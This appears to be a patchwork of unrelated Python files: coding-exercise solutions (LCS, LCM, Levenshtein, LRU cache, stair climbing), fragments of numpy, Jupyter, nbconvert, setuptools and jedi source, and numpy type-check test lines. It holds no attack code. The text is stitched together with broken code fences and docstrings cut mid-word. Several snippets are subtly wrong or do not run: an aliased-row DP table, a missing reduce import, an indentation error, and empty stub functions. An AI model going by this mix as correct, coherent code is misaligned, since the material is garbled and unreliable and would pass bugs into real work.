        frequency_list = {}
        for i in nums:
            if i not in number_frequency:
                number_frequency[i] = 1
            else:
                number_frequency[i] += 1
        for key, value in number_frequency.items():
            if value not in frequency_list:
                frequency_list[value] = [key]
            else:
                frequency_list[value].append(key)
        result = []
        for i in range(len(nums), 0, -1):
            if i in frequency_list:
                result.extend(frequency_list[i])
            if len(result) >= k:
                break
        return result


ob1 = Solution()
print(ob1.topKFrequent([1, 1, 1, 1, 2, 2, 3, 3, 3], 2))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def print_scores(**kw):
    print("      Name  Score")
    print("------------------")
    for name, score in kw.items():
        print("%10s  %d" % (name, score))
    print()


print_scores(Adam=99, Lisa=88, Bart=77)

data = {"Adam Lee": 99, "Lisa S": 88, "F.Bart": 77}

print_scores(**data)


def print_info(name, *, gender, city="Beijing", age):
    print("Personal Info")
    print("---------------")
    print("   Name: %s" % name)
    print(" Gender: %s" % gender)
    print("   City: %s" % city)
    print("    Age: %s" % age)
    print()


print_info("Bob", gender="male", age=20)
print_info("Lisa", gender="female", city="Shanghai", age=18)

import os

from numpy.distutils.fcompiler import FCompiler

compilers = ["LaheyFCompiler"]


class LaheyFCompiler(FCompiler):

    compiler_type = "lahey"
    description = "Lahey/Fujitsu Fortran 95 Compiler"
    version_pattern = r"Lahey/Fujitsu Fortran 95 Compiler Release (?P<version>[^\s*]*)"

    executables = {
        "version_cmd": ["<F90>", "--version"],
        "compiler_f77": ["lf95", "--fix"],
        "compiler_fix": ["lf95", "--fix"],
        "compiler_f90": ["lf95"],
        "linker_so": ["lf95", "-shared"],
        "archiver": ["ar", "-cr"],
        "ranlib": ["ranlib"],
    }

    module_dir_switch = None  # XXX Fix me
    module_include_switch = None  # XXX Fix me

    def get_flags_opt(self):
        return ["-O"]

    def get_flags_debug(self):
        return ["-g", "--chk", "--chkglobal"]

    def get_library_dirs(self):
        opt = []
        d = os.environ.get("LAHEY")
        if d:
            opt.append(os.path.join(d, "lib"))
        return opt

    def get_libraries(self):
        opt = []
        opt.extend(["fj9f6", "fj9i6", "fj9ipp", "fj9e6"])
        return opt


if __name__ == "__main__":
    from distutils import log

    log.set_verbosity(2)
    from numpy.distutils import customized_fcompiler

    print(customized_fcompiler(compiler="lahey").get_version())

from notebook.services.contents.filemanager import FileContentsManager
from contextlib import contextmanager
from tornado import web
import nbformat
import base64
import os, io


class LargeFileManager(FileContentsManager):
    """Handle large file upload."""

    def save(self, model, path=""):
        """Save the file model and return the model with no content."""
        chunk = model.get("chunk", None)
        if chunk is not None:
            path = path.strip("/")

            if "type" not in model:
                raise web.HTTPError(400, u"No file type provided")
            if model["type"] != "file":
                raise web.HTTPError(
                    400,
                    u'File type "{}" is not supported for large file transfer'.format(
                        model["type"]
                    ),
                )
            if "content" not in model and model["type"] != "directory":
                raise web.HTTPError(400, u"No file content provided")

            os_path = self._get_os_path(path)

            try:
                if chunk == 1:
                    self.log.debug("Saving %s", os_path)
                    self.run_pre_save_hook(model=model, path=path)
                    super()._save_file(os_path, model["content"], model.get("format"))
                else:
                    self._save_large_file(
                        os_path, model["content"], model.get("format")
                    )
            except web.HTTPError:
                raise
            except Exception as e:
                self.log.error(
                    u"Error while saving file: %s %s", path, e, exc_info=True
                )
                raise web.HTTPError(
                    500, u"Unexpected error while saving file: %s %s" % (path, e)
                ) from e

            model = self.get(path, content=False)

            # Last chunk
            if chunk == -1:
                self.run_post_save_hook(model=model, os_path=os_path)
            return model
        else:
            return super().save(model, path)

    def _save_large_file(self, os_path, content, format):
        """Save content of a generic file."""
        if format not in {"text", "base64"}:
            raise web.HTTPError(
                400, "Must specify format of file contents as 'text' or 'base64'"
            )
        try:
            if format == "text":
                bcontent = content.encode("utf8")
            else:
                b64_bytes = content.encode("ascii")
                bcontent = base64.b64decode(b64_bytes)
        except Exception as e:
            raise web.HTTPError(
                400, u"Encoding error saving %s: %s" % (os_path, e)
            ) from e

        with self.perm_to_403(os_path):
            if os.path.islink(os_path):
                os_path = os.path.join(os.path.dirname(os_path), os.readlink(os_path))
            with io.open(os_path, "ab") as f:
                f.write(bcontent)
````

```pysolution to the largest-continuous-sum problem"""


def largest_continuous_sum(arr):
    """returns the highest sum of a continuous sequence in a given list"""

    largest = 0
    queue = []
    for num in arr:
        if len(queue) > 0 and queue[-1] + 1 != num:
            sum = reduce(lambda x, y: x + y, queue)
            if largest < sum:
                largest = sum
            queue = []

        queue.append(num)

    return largest

# Author: Abhijeeth S

import math


def res(x, y):
    if 0 not in (x, y):
        # We use the relation x^y = y*log10(x), where 10 is the base.
        return y * math.log10(x)
    else:
        if x == 0:  # 0 raised to any number is 0
            return 0
        elif y == 0:
            return 1  # any number raised to 0 is 1


if __name__ == "__main__":  # Main function
    # Read two numbers from input and typecast them to int using map function.
    # Here x is the base and y is the power.
    prompt = "Enter the base and the power separated by a comma: "
    x1, y1 = map(int, input(prompt).split(","))
    x2, y2 = map(int, input(prompt).split(","))

    # We find the log of each number, using the function res(), which takes two
    # arguments.
    res1 = res(x1, y1)
    res2 = res(x2, y2)

    # We check for the largest number
    if res1 > res2:
        print("Largest number is", x1, "^", y1)
    elif res2 > res1:
        print("Largest number is", x2, "^", y2)
    else:
        print("Both are equal")

from sys import maxsize


def max_sub_array_sum(a: list, size: int = 0):
    """
    >>> max_sub_array_sum([-13, -3, -25, -20, -3, -16, -23, -12, -5, -22, -15, -4, -7])
    -3
    """
    size = size or len(a)
    max_so_far = -maxsize - 1
    max_ending_here = 0
    for i in range(0, size):
        max_ending_here = max_ending_here + a[i]
        if max_so_far < max_ending_here:
            max_so_far = max_ending_here
        if max_ending_here < 0:
            max_ending_here = 0
    return max_so_far


if __name__ == "__main__":
    a = [-13, -3, -25, -20, 1, -16, -23, -12, -5, -22, -15, -4, -7]
    print(("Maximum contiguous sum is", max_sub_array_sum(a, len(a))))

# Program to find last index of an element in array.
def lastIndex(arr, si, x):
    l = len(arr)
    if si == l:  # if the start index is greater than size of array.
        return -1
    smallerListOutput = lastIndex(arr, si + 1, x)  # recirsion
    if smallerListOutput != -1:
        return (
            smallerListOutput
        )  # if the element is found in the second part of array return index+1
    else:
        if (
            arr[si] == x
        ):  # if element is not found in second part of array check for 1st element
            return si
        else:
            return -1


n = int(input("Enter size of array : "))
a = []
for i in range(n):
    ele = int(input())
    a.append(ele)
x = int(input("Enter element whose last index is to be found : "))
print(lastIndex(a, 0, x))

# Example
# Input 5
# 2 1 2 1 3
# 1
# Output
# 3
```

````py
We have a collection of stones, each stone has a positive integer weight.

Each turn, we choose the two heaviest stones and smash them together.  Suppose the stones have weights x and y with x <= y.  The result of this smash is:

If x == y, both stones are totally destroyed;
If x != y, the stone of weight x is totally destroyed, and the stone of weight y has new weight y-x.
At the end, there is at most 1 stone left.  Return the weight of this stone (or 0 if there are no stones left.)```


```py


def lastStoneWeight(stones):
    def getLast(arr):
        # get the index of the max num
        ind = arr.index(max(arr))
        # swap the max with the last element to make the deletion process efficient (O(n) time and O(1) space)
        arr[-1], arr[ind] = arr[ind], arr[-1]
        return arr.pop()

    while len(stones) > 1:
        # delete the largest ele from the stones list
        largest = getLast(stones)
        # delete the second largest ele from the stones list
        sec_largest = getLast(stones)
        # in case if the largest is not equal to the second largest we add the difference to the stones list again
        if largest != sec_largest:
            stones.append(largest - sec_largest)
    # if stones is not empty
    if stones:
        return stones[0]
    return 0


print(lastStoneWeight([5, 3, 2, 10]))

def check_mat(m):
    d_sum = 0
    r_rows = 0
    r_col = 0
    c_rep = {}
    for i in range(len(m)):
        rep = {}
        for j in range(len(m)):
            ele = m[i][j]
            if i == j:
                d_sum += ele
            rep[ele] = 1
            if j not in c_rep:
                c_rep[j] = {ele}
            else:
                c_rep[j].add(ele)
        if len(rep) != len(m):
            r_rows += 1
    for i, v in c_rep.items():
        if len(v) != len(m):
            r_col += 1
    return d_sum, r_rows, r_col


# input() reads a string with a line of input, stripping the ' ' (newline) at the end.
# This is all you need for most Code Jam problems.
t = int(input())  # read a line with a single integer
for i in range(1, t + 1):
    m = []
    rows = int(input())
    for i in range(1, rows + 1):
        m.append([int(s) for s in input().split(" ")])

def lateRide(n):
 """
 Return sum of hours and minutes past 00:00
 """
    hours = str(n // 60)
    minutes = str(n % 60)
    total = 0
    for digit in hours:
        total += int(digit)
    for digit in minutes:
        total += int(digit)
    return total

````

````pyLatex filters.

Module of useful filters for processing Latex within Jinja latex templates.```


```py
# -----------------------------------------------------------------------------
# Copyright (c) 2013, the IPython Development Team.
#
# Distributed under the terms of the Modified BSD License.
#
# The full license is in the file COPYING.txt, distributed with this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------
import re
from nbconvert.utils.pandoc import pandoc

# -----------------------------------------------------------------------------
# Globals and constants
# -----------------------------------------------------------------------------

LATEX_RE_SUBS = ((re.compile(r"\.\.\.+"), r"{\\ldots}"),)

# Latex substitutions for escaping latex.
# see: http://stackoverflow.com/questions/16259923/how-can-i-escape-latex-special-characters-inside-django-templates

LATEX_SUBS = {
    "&": r"\&",
    "%": r"\%",
    "$": r"\$",
    "#": r"\#",
    "_": r"\_",
    "{": r"\{",
    "}": r"\}",
    "~": r"\textasciitilde{}",
    "^": r"\^{}",
    "\\": r"\textbackslash{}",
}


# -----------------------------------------------------------------------------
# Functions
# -----------------------------------------------------------------------------

__all__ = ["escape_latex"]


def escape_latex(text):
    """
    Escape characters that may conflict with latex.

    Parameters
    ----------
    text : str
        Text containing characters that may conflict with Latex
    """
    text = "".join(LATEX_SUBS.get(c, c) for c in text)
    for pattern, replacement in LATEX_RE_SUBS:
        text = pattern.sub(replacement, text)

    return text
````

````py
Launch the Python script on the command line after
setuptools is bootstrapped via import.```


```py

# Note that setuptools gets imported implicitly by the
# invocation of this script using python -m setuptools.launch

import tokenize
import sys


def run():
    """
    Run the script in sys.argv[1] as if it had
    been invoked naturally.
    """
    __builtins__
    script_name = sys.argv[1]
    namespace = dict(__file__=script_name, __name__="__main__", __doc__=None)
    sys.argv[:] = sys.argv[1:]

    open_ = getattr(tokenize, "open", open)
    with open_(script_name) as fid:
        script = fid.read()
    norm_script = script.replace("\\r\\n", "\\n")
    code = compile(norm_script, script_name, "exec")
    exec(code, namespace)


if __name__ == "__main__":
    run()

from jedi.inference.base_value import ValueSet, NO_VALUES
from jedi.common import monkeypatch


class AbstractLazyValue:
    def __init__(self, data, min=1, max=1):
        self.data = data
        self.min = min
        self.max = max

    def __repr__(self):
        return '<%s: %s>' % (self.__class__.__name__, self.data)

    def infer(self):
        raise NotImplementedError


class LazyKnownValue(AbstractLazyValue):
    """data is a Value."""
    def infer(self):
        return ValueSet([self.data])


class LazyKnownValues(AbstractLazyValue):
    """data is a ValueSet."""
    def infer(self):
        return self.data


class LazyUnknownValue(AbstractLazyValue):
    def __init__(self, min=1, max=1):
        super().__init__(None, min, max)

    def infer(self):
        return NO_VALUES


class LazyTreeValue(AbstractLazyValue):
    def __init__(self, context, node, min=1, max=1):
        super().__init__(node, min, max)
        self.context = context
        # We need to save the predefined names. It's an unfortunate side effect
        # that needs to be tracked otherwise results will be wrong.
        self._predefined_names = dict(context.predefined_names)

    def infer(self):
        with monkeypatch(self.context, 'predefined_names', self._predefined_names):
            return self.context.infer_node(self.data)


def get_merged_lazy_value(lazy_values):
    if len(lazy_values) > 1:
        return MergedLazyValues(lazy_values)
    else:
        return lazy_values[0]


class MergedLazyValues(AbstractLazyValue):
    """data is a list of lazy values."""
    def infer(self):
        return ValueSet.from_sets(l.infer() for l in self.data)

# function to find lcm of two numbers
def findLcm(i, v):
    if i > v:
        x = i
    else:
        x = v
    while True:
        if (x % i == 0) and (x % v == 0):
            lcm = x
            return x
            break
        x = x + 1


# Main code
while True:
    startOrEnd = str(input("Count lcm or End : "))
    if startOrEnd == "Count lcm":
        getFirst = float(input("First num : "))
        getSecond = float(input("Second num : "))
        print(findLcm(getFirst, getSecond))
    else:
        quit()
````

````py
Author: Ashutosh Gupta
Created On: 8/17/2017
Time: 10:03 PM```


```py
import inspect


def gcd(x, y):
    """
    Function to find gcm (greatest common divisor) of two numbers
    :param x: first number
    :param y: second number
    :return: gcd of x and y
    """
    while y != 0:
        (x, y) = (y, x % y)
    return x


def lcm_using_gcd(_list):
    """
    function to find LCM for given list of elements

    :param _list: _list of which LCM is to be found out
    """
    lcm = _list[0]
    for element in _list:
        lcm = lcm * element / gcd(lcm, element)
    return lcm


def get_code():
    """
    returns the code for the gcd function
    """
    return inspect.getsource(lcm_using_gcd)

from suffix_array import SuffixArray

class LCP(object):
 def __init__(self, s):
  self.s = s
  self.lcp_array = []
  self.suffix_array = SuffixArray(s)
  self.suffix_array.create_suffix_array()

 def lcp_w_suffix_str(self):
  N = len(self.suffix_array.suffix_array)
  array = self.suffix_array.suffix_array

  self.lcp_array = [0]*N
  inv_suffix = [0]*N

  for index in range(N):
   inv_suffix[array[index].index] = index

  maxLen = 0

  for index in range(N):
   if inv_suffix[index] == N-1:
    maxLen = 0
    continue

   index_j = array[inv_suffix[index]+1].index
   while(index+maxLen < N and index_j+maxLen < N and self.s[index+maxLen] == self.s[index_j+maxLen]):
    maxLen += 1

   self.lcp_array[inv_suffix[index]] = maxLen

   if maxLen > 0:
    maxLen -= 1

  return self.lcp_array


if __name__ == '__main__':
 lcp = LCP("banana")
 lcp.lcp_w_suffix_str()
 print lcp.lcp_array```


```py
A subsequence is a sequence that can be derived from another
sequence by deleting some or no elements without changing the
order of the remaining elements.

For example, 'abd' is a subsequence of 'abcd' whereas 'adc' is not

Given 2 strings containing lowercase english alphabets, find the length
of the Longest Common Subsequence (L.C.S.).

Example:
    Input:  'abcdgh'
            'aedfhr'
    Output: 3

    Explanation: The longest subsequence common to both the string is "adh"

Time Complexity : O(M*N)
Space Complexity : O(M*N), where M and N are the lengths of the 1st and 2nd string
respectively.
````

```py


def longest_common_subsequence(s1, s2):
    """
    :param s1: string
    :param s2: string
    :return: int
    """
    m, n = len(s1), len(s2)

    dp = [[0] * (n + 1)] * (m + 1)
    """
    dp[i][j] : contains length of LCS of s1[0..i-1] and s2[0..j-1]
    """

    for i in range(1, m + 1):
        for j in range(1, n + 1):
            if s1[i - 1] == s2[j - 1]:
                dp[i][j] = dp[i - 1][j - 1] + 1
            else:
                dp[i][j] = max(dp[i - 1][j], dp[i][j - 1])

    return dp[m][n]

def LCSlength(X, Y, lx, ly) : # Parameters are the two strings and their lengths
    if (lx==0 or ly==0) :
        return 0
    if (X[lx-1] == Y[ly-1]) :
        return LCSlength(X, Y, lx-1, ly-1) + 1
    return max(LCSlength(X, Y, lx-1, ly), LCSlength(X, Y, lx, ly-1))

print("Enter the first string : \n")
X = input()
print("Enter the second string: \n")
Y = input()
print("The length of the LCS is : {}".format(LCSlength(X, Y, len(X), len(Y))))

#This solution has a time complexity of o(2^(lx+ly))
#Also, this LCS problem has overlapping subproblems



import unittest
from timeit import timeit


def least_common_multiple_slow(first_num: int, second_num: int) -> int:
    """
    Find the least common multiple of two numbers.

    Learn more: https://en.wikipedia.org/wiki/Least_common_multiple

    >>> least_common_multiple_slow(5, 2)
    10
    >>> least_common_multiple_slow(12, 76)
    228
    """
    max_num = first_num if first_num >= second_num else second_num
    common_mult = max_num
    while (common_mult % first_num > 0) or (common_mult % second_num > 0):
        common_mult += max_num
    return common_mult


def greatest_common_divisor(a: int, b: int) -> int:
    """
    Calculate Greatest Common Divisor (GCD).
    see greatest_common_divisor.py
    >>> greatest_common_divisor(24, 40)
    8
    >>> greatest_common_divisor(1, 1)
    1
    >>> greatest_common_divisor(1, 800)
    1
    >>> greatest_common_divisor(11, 37)
    1
    >>> greatest_common_divisor(3, 5)
    1
    >>> greatest_common_divisor(16, 4)
    4
    """
    return b if a == 0 else greatest_common_divisor(b % a, a)


def least_common_multiple_fast(first_num: int, second_num: int) -> int:
    """
    Find the least common multiple of two numbers.
    https://en.wikipedia.org/wiki/Least_common_multiple#Using_the_greatest_common_divisor
    >>> least_common_multiple_fast(5,2)
    10
    >>> least_common_multiple_fast(12,76)
    228
    """
    return first_num // greatest_common_divisor(first_num, second_num) * second_num


def benchmark():
    setup = (
        "from __main__ import least_common_multiple_slow, least_common_multiple_fast"
    )
    print(
        "least_common_multiple_slow():",
        timeit("least_common_multiple_slow(1000, 999)", setup=setup),
    )
    print(
        "least_common_multiple_fast():",
        timeit("least_common_multiple_fast(1000, 999)", setup=setup),
    )


class TestLeastCommonMultiple(unittest.TestCase):

    test_inputs = [
        (10, 20),
        (13, 15),
        (4, 31),
        (10, 42),
        (43, 34),
        (5, 12),
        (12, 25),
        (10, 25),
        (6, 9),
    ]
    expected_results = [20, 195, 124, 210, 1462, 60, 300, 50, 18]

    def test_lcm_function(self):
        for i, (first_num, second_num) in enumerate(self.test_inputs):
            slow_result = least_common_multiple_slow(first_num, second_num)
            fast_result = least_common_multiple_fast(first_num, second_num)
            with self.subTest(i=i):
                self.assertEqual(slow_result, self.expected_results[i])
                self.assertEqual(fast_result, self.expected_results[i])


if __name__ == "__main__":
    benchmark()
    unittest.main()

import sys
from abc import abstractmethod
from collections import deque


class LRUCache:
    """Page Replacement Algorithm, Least Recently Used (LRU) Caching."""

    dq_store = object()  # Cache store of keys
    key_reference_map = object()  # References of the keys in cache
    _MAX_CAPACITY: int = 10  # Maximum capacity of cache

    @abstractmethod
    def __init__(self, n: int):
        """Creates an empty store and map for the keys.
        The LRUCache is set the size n.
        """
        self.dq_store = deque()
        self.key_reference_map = set()
        if not n:
            LRUCache._MAX_CAPACITY = sys.maxsize
        elif n < 0:
            raise ValueError("n should be an integer greater than 0.")
        else:
            LRUCache._MAX_CAPACITY = n

    def refer(self, x):
        """
        Looks for a page in the cache store and adds reference to the set.
        Remove the least recently used key if the store is full.
        Update store to reflect recent access.
        """
        if x not in self.key_reference_map:
            if len(self.dq_store) == LRUCache._MAX_CAPACITY:
                last_element = self.dq_store.pop()
                self.key_reference_map.remove(last_element)
        else:
            index_remove = 0
            for idx, key in enumerate(self.dq_store):
                if key == x:
                    index_remove = idx
                    break
            self.dq_store.remove(index_remove)

        self.dq_store.appendleft(x)
        self.key_reference_map.add(x)

    def display(self):
        """
        Prints all the elements in the store.
        """
        for k in self.dq_store:
            print(k)


if __name__ == "__main__":
    lru_cache = LRUCache(4)
    lru_cache.refer(1)
    lru_cache.refer(2)
    lru_cache.refer(3)
    lru_cache.refer(1)
    lru_cache.refer(4)
    lru_cache.refer(5)
    lru_cache.display()

# Given a word, return all the anagrams of that word in the English language.

f = open("words.txt", "r")
words = f.read().split("\n")
words = [w.lower() for w in words]
f.close()
anagram = {}
# GENERATE ALL SETS OF ANAGRAMS
for word in words:
    # convert list to string
    signature = "".join(sorted(word.lower()))
    if signature not in anagram:
        anagram[signature] = []
    anagram[signature].append(word)


def anagrams(w):
    sig = "".join(sorted(w.lower()))
    if sig not in anagram:
        return []
    else:
        return anagram[sig]


print(anagrams("iceman"))
```

````py
 You are climbing a stair case. It takes n steps to reach to the top.

 Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?

 Note: Given n will be a positive integer.

 Example 1:

 Input: 2
 Output: 2
 Explanation: There are two ways to climb to the top.
 1. 1 step + 1 step
 2. 2 steps```


```py


class Solution(object):
    def climbStairs(self, n):
        """
        :type n: int
        :rtype: int
        """
        if n == 0:
            return 0

        dp = [0] * n
        dp[0], dp[1] = 1, 2

        for index in range(2, n):
            dp[index] = dp[index - 1] + dp[index - 2]
        return dp[n - 1]


# Time: O(N)
# Space: O(N)

def addTwoNumbers(l1, l2):
    l1.reverse()
    l2.reverse()
    con_1 = ""
    con_2 = ""
    for i in l1:
        con_1 += str(i)
    for i in l2:
        con_2 += str(i)

    result = int(con_1) + int(con_2)

    temp = str(result)

    lis = []
    for i in temp:
        lis.append(i)

    lis.reverse()
    return lis


l1 = [2, 4, 3]
l2 = [5, 6, 4]
result = addTwoNumbers(l1, l2)
print(result)
````

````py
View the full problem and run the test cases at:
https://leetcode.com/problems/convert-sorted-array-to-binary-search-tree/```


```py


class TreeNode(object):
    def __init__(self, val=0, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right


def sortedArrayToBST(nums):
    """
  :type nums: List[int]
  :rtype: TreeNode
  """


bst_root = sortedArrayToBST([-10, -3, 0, 5, 9])
print(bst_root.val)  # 0
# print(bst_root.left.val)          # -3
# print(bst_root.left.left.val)     # -10
# print(bst_root.right.val)         # 9
# print(bst_root.right.left.val)    # 5
# Returns the root of the following binary search tree:
#       0
#      / \
#    -3   9
#    /   /
#  -10  5
````

````py
View the full problem and run the test cases at:
https://leetcode.com/problems/balanced-binary-tree/```


```py


class TreeNode(object):
    def __init__(self, val=0, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right


def isBalanced(root):
    """
  :type root: TreeNode
  :rtype: bool
  """


# Tree: [3,9,20,null,null,15,7]
#   3
#  / \
# 9  20
#   /  \
#  15   7
node_3 = TreeNode(3)
node_20 = TreeNode(20)
node_3.left = TreeNode(9)
node_3.right = node_20
node_20.left = TreeNode(15)
node_20.right = TreeNode(7)
print(isBalanced(node_3))  # True

# Tree: [1,2,2,3,3,null,null,4,4]
#        1
#       / \
#      2   2
#     / \
#    3   3
#   / \
#  4   4
node_1 = TreeNode(1)
node_2a = TreeNode(2)
node_2b = TreeNode(2)
node_1.left = node_2a
node_1.right = node_2b

node_3a = TreeNode(3)
node_3b = TreeNode(3)
node_2a.left = node_3a
node_2a.right = node_3b

node_4a = TreeNode(4)
node_4b = TreeNode(4)
node_3a.left = node_4a
node_3a.right = node_4b
print(isBalanced(node_1))  # False

#!/usr/bin/python
# -*- coding: utf-8 -*-

import math

# Length of array(number of elements in array)
# is simple algorithm
#  Iterates through array
#  at each iteration (count) variable
#  is incremented
#
# This solution is ideal for small array
# But not that good for bigger array's

# There are many ways to do same thing
# but always go with solution that is
# simple, and has least instructions
# for computer to execute, making
# process faster

# is_ap parameter indicates weather array
# is an arithmetic progression or not
#
# Similarly,
# is_gp indicates weather array is an geometric progression or not
# If array is either ap or gp then it's length can be
# found by derivation of it's general term formula
# e.g. ap's general term,
# tn = a + (n - 1)d
# thus, n = (tn - a) / d + 1


def length(ar, is_ap=False, is_gp=False, big_data=False, data_outline=[]):
    # Length of data if it is an arithmetic progression
    # using derived formula, n = (tn - a) / d + 1
    if is_ap:
        return ((ar[-1] - ar[0]) / (ar[1] - ar[0])) + 1

    # Length of data if it is an geometric progression
    # using derived formula, n = ((log base 10 an / a1) / log 10 r) + 1
    elif is_gp:
        # length is never a float
        return int(math.log10((ar[-1] / ar[0])) / math.log10((ar[1] / ar[0])) + 1)

    # Length of big data using data outline
    # data outline is selective elements to be counted from entire
    # data
    elif big_data:
        count = 0
        for element in data_outline:
            count += ar.count(element)
        return count

    # Sequential counting
    # of elements in array
    else:
        res = 0
        for item in ar:
            res += 1
        return res


# Test
# Geometric progression Test
if (
    length([1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096], None, is_gp=True)
    == 13
):
    print("\nLength of geometric progression: " + str(13))
    print("--> geometric progression counting works!\n")
else:
    print("Something's wrong with gp feature")

# Arithmetic progression test
if length([1, 4, 7, 10, 13, 16, 19, 22, 25, 28, 31, 34, 37, 40, 43], is_ap=True) == 15:
    print("Length of arithmetic progression: " + str(15))
    print("--> arithmetic progression counting works!\n")
else:
    print("Something's wrong with ap feature")

# Big data test
# Passing only useful numbers in outline array
if (
    length([1, 1, 4, 5, 7, 1, 9, 5, 2, 4, 3, 5, 9], None, None, True, [1, 4, 5, 7, 9])
    == 11
):
    print("Length of arithmetic progression: " + str(11))
    print("--> big data counting works!\n")
else:
    print("Something's wrong with ap feature")

# Small data
print("Length: " + str(length([1, 1, 2, 3, 5, 8, 13, 21, 34, 55])))
print("Everything Works!\n")

nums = [12, 34, 65, 43, 21, 97, 13, 57, 10, 32]
finalNums = []
moreFinalNums = []


def compareMore(a):
    for x in nums:
        if x > a:
            c = finalNums.append(x)


def compareLess(d):
    for x in nums:
        if x < d:
            c = moreFinalNums.append(x)


get = int(input("To Compare More Than : "))
getAgain = int(input("To Compare Less Than : "))

print("\nMore Than Values : ")
print(compareMore(get))
print(finalNums, "\n")

print("\nLess Than Values : ")
print(compareLess(getAgain))
print(moreFinalNums, "\n")
````

````py
Letter Combinations of a Phone Number

Given a string containing digits from 2-9 inclusive, return all possible letter combinations that the number could represent.
A mapping of digit to letters is just like on the telephone buttons. Note that 1 does not map to any letters.

Input: '23'
Output: ['ad', 'ae', 'af', 'bd', 'be', 'bf', 'cd', 'ce', 'cf']

=========================================
This problem could be solved in several ways (using recursion, stack, queue...) and the complexity is same in all, but this one has the simplest code.
Iterate all digits and in each step look for the previous combinations, create a new 3 or 4 combinations from each combination using the mapping letters.
    Time Complexity:    O(3^N * 4^M)    , N = number of digits that maps to 3 letters, M = number of digits that maps to 4 letters
    Space Complexity:   O(3^N * 4^M)```


```py


############
# Solution #
############


def letter_combinations(digits):
    if len(digits) == 0:
        return []

    mappings = {
        "2": ["a", "b", "c"],
        "3": ["d", "e", "f"],
        "4": ["g", "h", "i"],
        "5": ["j", "k", "l"],
        "6": ["m", "n", "o"],
        "7": ["p", "q", "r", "s"],
        "8": ["t", "u", "v"],
        "9": ["w", "x", "y", "z"],
    }
    prev_combinations = [""]

    for digit in digits:
        new_combinations = []
        for combination in prev_combinations:
            # use the mappings and create new combinations
            for mapping in mappings[digit]:
                new_combinations.append(combination + mapping)
        # save the newest combinations
        prev_combinations = new_combinations

    return prev_combinations


###########
# Testing #
###########

# Test 1
# Correct result => ['ad', 'ae', 'af', 'bd', 'be', 'bf', 'cd', 'ce', 'cf']
print(letter_combinations("23"))

def letter_count(s):
    pass

def print_sorted_letter_count(s):
    pass


print_sorted_letter_count("aaabbc")
#print_sorted_letter_count("Hello!")
#print_sorted_letter_count("The quick brown fox jumps over the lazy dogs")```


```py
This is a Python implementation of the levenshtein distance.
Levenshtein distance is a string metric for measuring the
difference between two sequences.

For doctests run following command:
python -m doctest -v levenshtein-distance.py
or
python3 -m doctest -v levenshtein-distance.py

For manual testing run:
python levenshtein-distance.py```


```py


def levenshtein_distance(first_word: str, second_word: str) -> int:
    """Implementation of the levenshtein distance in Python.
    :param first_word: the first word to measure the difference.
    :param second_word: the second word to measure the difference.
    :return: the levenshtein distance between the two words.
    Examples:
    >>> levenshtein_distance("planet", "planetary")
    3
    >>> levenshtein_distance("", "test")
    4
    >>> levenshtein_distance("book", "back")
    2
    >>> levenshtein_distance("book", "book")
    0
    >>> levenshtein_distance("test", "")
    4
    >>> levenshtein_distance("", "")
    0
    >>> levenshtein_distance("orchestration", "container")
    10
    """
    # The longer word should come first
    if len(first_word) < len(second_word):
        return levenshtein_distance(second_word, first_word)

    if len(second_word) == 0:
        return len(first_word)

    previous_row = range(len(second_word) + 1)

    for i, c1 in enumerate(first_word):

        current_row = [i + 1]

        for j, c2 in enumerate(second_word):

            # Calculate insertions, deletions and substitutions
            insertions = previous_row[j + 1] + 1
            deletions = current_row[j] + 1
            substitutions = previous_row[j] + (c1 != c2)

            # Get the minimum to append to the current row
            current_row.append(min(insertions, deletions, substitutions))

        # Store the previous row
        previous_row = current_row

    # Returns the last element (distance)
    return previous_row[-1]


if __name__ == "__main__":
    first_word = input("Enter the first word:\n").strip()
    second_word = input("Enter the second word:\n").strip()

    result = levenshtein_distance(first_word, second_word)
    print(f"Levenshtein distance between {first_word} and {second_word} is {result}")
````

```pyDeprecated as of 5.0; import from IPython.lib.lexers instead."""
from warnings import warn

warn("nbconvert.utils.lexers is deprecated as of 5.0. Use IPython.lib.lexers")

from IPython.lib.lexers import *
```

````py
Customized Mixin2to3 support:

 - adds support for converting doctests```


```py

import warnings
from distutils.util import Mixin2to3 as _Mixin2to3
from distutils import log
from lib2to3.refactor import RefactoringTool, get_fixers_from_package

import setuptools
from ._deprecation_warning import SetuptoolsDeprecationWarning


class DistutilsRefactoringTool(RefactoringTool):
    def log_error(self, msg, *args, **kw):
        log.error(msg, *args)

    def log_message(self, msg, *args):
        log.info(msg, *args)

    def log_debug(self, msg, *args):
        log.debug(msg, *args)


class Mixin2to3(_Mixin2to3):
    def run_2to3(self, files, doctests=False):
        # See of the distribution option has been set, otherwise check the
        # setuptools default.
        if self.distribution.use_2to3 is not True:
            return
        if not files:
            return

        warnings.warn(
            "2to3 support is deprecated. If the project still "
            "requires Python 2 support, please migrate to "
            "a single-codebase solution or employ an "
            "independent conversion process.",
            SetuptoolsDeprecationWarning,
        )
        log.info("Fixing " + " ".join(files))
        self.__build_fixer_names()
        self.__exclude_fixers()
        if doctests:
            if setuptools.run_2to3_on_doctests:
                r = DistutilsRefactoringTool(self.fixer_names)
                r.refactor(files, write=True, doctests_only=True)
        else:
            _Mixin2to3.run_2to3(self, files)

    def __build_fixer_names(self):
        if self.fixer_names:
            return
        self.fixer_names = []
        for p in setuptools.lib2to3_fixer_packages:
            self.fixer_names.extend(get_fixers_from_package(p))
        if self.distribution.use_2to3_fixers is not None:
            for p in self.distribution.use_2to3_fixers:
                self.fixer_names.extend(get_fixers_from_package(p))

    def __exclude_fixers(self):
        excluded_fixers = getattr(self, "exclude_fixers", [])
        if self.distribution.use_2to3_exclude_fixers is not None:
            excluded_fixers.extend(self.distribution.use_2to3_exclude_fixers)
        for fixer_name in excluded_fixers:
            if fixer_name in self.fixer_names:
                self.fixer_names.remove(fixer_name)

import numpy as np

np.deprecate(1)  # E: No overload variant

np.deprecate_with_doc(1)  # E: incompatible type

np.byte_bounds(1)  # E: incompatible type

np.who(1)  # E: incompatible type

np.lookfor(None)  # E: incompatible type

np.safe_eval(None)  # E: incompatible type

from numpy.lib import NumpyVersion

version: NumpyVersion

NumpyVersion(b"1.8.0")  # E: incompatible type
